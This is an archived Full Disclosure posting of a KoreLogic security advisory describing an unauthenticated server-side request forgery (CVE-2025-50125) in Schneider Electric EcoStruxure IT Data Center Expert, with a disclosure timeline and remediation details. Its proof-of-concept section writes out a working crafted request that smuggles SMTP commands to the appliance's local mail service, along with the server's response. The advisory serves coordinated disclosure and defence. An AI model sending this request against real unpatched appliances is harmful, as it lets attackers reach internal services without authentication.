---
title: KL-001-2025-011: Schneider Electric EcoStruxure IT Data Center Expert Unauthenticated Server-Side Request Forgery
url: https://seclists.org/fulldisclosure/2025/Jul/10
source: Full Disclosure
date: 2025-07-10
fetch_date: 2025-10-06T23:52:16.024672
---

# KL-001-2025-011: Schneider Electric EcoStruxure IT Data Center Expert Unauthenticated Server-Side Request Forgery

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](9)
[By Date](date.html#10)
[![Next](/images/right-icon-16x16.png)](11)

[![Previous](/images/left-icon-16x16.png)](9)
[By Thread](index.html#10)
[![Next](/images/right-icon-16x16.png)](11)

![](/shared/images/nst-icons.svg#search)

# KL-001-2025-011: Schneider Electric EcoStruxure IT Data Center Expert Unauthenticated Server-Side Request Forgery

---

*From*: KoreLogic Disclosures via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Wed, 9 Jul 2025 17:18:08 -0500

---

```
KL-001-2025-011: Schneider Electric EcoStruxure IT Data Center Expert Unauthenticated Server-Side Request Forgery

Title: Schneider Electric EcoStruxure IT Data Center Expert Unauthenticated Server-Side Request Forgery
Advisory ID: KL-001-2025-011
Publication Date: 2025-07-09
Publication URL: https://korelogic.com/Resources/Advisories/KL-001-2025-011.txt

1. Vulnerability Details

     Affected Vendor: Schneider Electric
     Affected Product: EcoStruxure IT Data Center Expert
     Affected Version: 8.3 and prior
     Platform: CentOS
     CWE Classification: CWE-918: Server-Side Request Forgery (SSRF)
     CVE ID: CVE-2025-50125

2. Vulnerability Description

     The Data Center Expert ("DCE") appliance insecurely forwards
     HTTP requests based on user-controlled values, enabling an
     unauthenticated user to coerce the web application into sending
     data to arbitrary locations, such as the SMTP service listening
     on localhost.

3. Technical Description

     When an HTTP request is sent to either the "/plugins" or
     "/capturelogs" endpoints, the request is forwarded based on
     the "Host" request header.  Since the "Host" request header is
     not validated, a user may supply any host / port combination
     and send data to arbitrary locations and view the response,
     creating a server-side request forgery vulnerability.

         GET /plugins HTTP/1.1
         Host: example.com

         HTTP/1.1 404 Not Found
         ...
         <!doctype html>
         <html>
         <head>
             <title>Example Domain</title>
         ...

     The upstream path is not controllable and HTTP redirects are
     not followed.

     Rather than issuing constrained HTTP requests, it is possible
     to instead send malicious data to other services that leverage
     protocols similar to HTTP, such as the SMTP service listening on
     the appliance's loopback address.  Attempts to send well-formed
     HTTP requests to the SMTP service result in the TCP connection
     being prematurely severed, as common HTTP verbs are a sign
     of malicious activity. However, the proxy mechanism employed
     by the DCE appliance does not validate the verb, allowing
     malformed requests that contain valid SMTP commands such as
     "EHLO" and "MAIL FROM".

     When unexpected data is received, such as the "Host" and
     "X-Forwarded-For" request header, a benign error is returned
     without severing the TCP connection, allowing for additional
     (and well-formed) SMTP commands to follow.

4. Mitigation and Remediation Recommendation

     Version 9.0 of EcoStruxure IT Data Center Expert includes
     fixes for these vulnerabilities and is available upon request
     from Schneider Electric's Customer Care Center. Refer to
https://download.schneider-electric.com/files?p_Doc_Ref=SEVD-2025-189-01&p_enDocType=Security+and+Safety+Notice&p_File_Name=SEVD-2025-189-01.pdf.

5. Credit

     This vulnerability was discovered by Jaggar Henry and Jim
     Becher of KoreLogic, Inc.

6. Disclosure Timeline

     2024-11-21 : KoreLogic reports vulnerability details to
                  Schneider Electric CPCERT.
     2024-11-22 : Vendor acknowledges receipt of KoreLogic's
                  submission.
     2024-12-06 : Vendor confirms the reported vulnerability.
     2024-12-12 : Vendor requests a meeting with KoreLogic to discuss
                  the timeline of remediation efforts for this
                  vulnerability, as well as for associated submissions
                  from KoreLogic.
     2024-12-18 : KoreLogic and Schneider Electric agree to embargo
                  vulnerability details until product update 9.0,
                  circa July, 2025.
     2025-01-29 : Vendor provides status update.
     2025-03-17 : Vendor provides beta release containing remediation
                  for this and other associated vulnerabilities
                  reported by KoreLogic.
     2025-06-20 : Vendor notifies KoreLogic that the publication date
                  for this vulnerability will be 2025-07-08.
     2025-07-08 : Vendor public disclosure.
     2025-07-09 : KoreLogic public disclosure.

7. Proof of Concept

     This behavior allows unauthenticated attackers to interact with
     services not usually exposed to the internet, such as the
     appliance's SMTP service, to further exploit and enumerate the
     system.

     The following is an HTTP request sent to the DCE web interface
     listening on TCP/80:

         EHLO /plugins?%0a%0dfoobar HTTP/1.1
         Host: 127.0.0.1:25
         Content-Length: 137

         HELO localhost
         MAIL FROM:<root@localhost>
         RCPT TO:<apcreset@localhost>
         DATA
         Subject: foobar

         This is a test email body
         .
         QUIT

     As shown in the HTTP response, request headers that do not
     represent valid SMTP commands are disregarded, allowing the
     body to be parsed as a valid message:

         HTTP/1.1 200 OK
         ...

         220 dce.example.com ESMTP Sendmail 8.14.4/8.14.4; Mon, 1 Jul 2024 07:00:08 -0400501 5.0.0 Invalid domain name
         500 5.5.1 Command unrecognized: "Host: 127.0.0.1:25"
         500 5.5.1 Command unrecognized: "X-Forwarded-For: 192.168.2.65"
         500 5.5.1 Command unrecognized: "X-Forwarded-Host: 127.0.0.1:25"
         500 5.5.1 Command unrecognized: "X-Forwarded-Server: dce.example.com"
         500 5.5.1 Command unrecognized: "Connection: Keep-Alive"
         500 5.5.1 Command unrecognized: "Content-Length: 141"
         500 5.5.1 Command unrecognized: ""
         250 dce.example.com Hello localhost.localdomain [127.0.0.1], pleased to meet you
         250 2.1.0 <root@localhost>... Sender ok
         250 2.1.5 <apcreset@localhost>... Recipient ok
         354 Enter mail, end with "." on a line by itself
         250 2.0.0 461B08WP030169 Message accepted for delivery
         221 2.0.0 dce.example.com closing connection

The contents of this advisory are copyright(c) 2025
KoreLogic, Inc. and are licensed under a Creative Commons
Attribution Share-Alike 4.0 (United States) License:
http://creativecommons.org/licenses/by-sa/4.0/

KoreLogic, Inc. is a founder-owned and operated company with a
proven track record of providing security services to entities
ranging from Fortune 500 to small and mid-sized companies. We
are a highly skilled team of senior security consultants doing
by-hand security assessments for the most important networks in
the U.S. and around the world. We are also developers of various
tools and resources aimed at helping the security community.
https://www.korelogic.com/about-korelogic.html

Our public vulnerability disclosure policy is available at:
https://korelogic.com/KoreLogic-Public-Vulnerability-Disclosure-Policy
```

**Attachment:
[OpenPGP\_signature.asc](att-10/OpenPGP_signature_asc.bin)**
*Description:* OpenPGP digital signature

```
_______________________________________________
Sent ...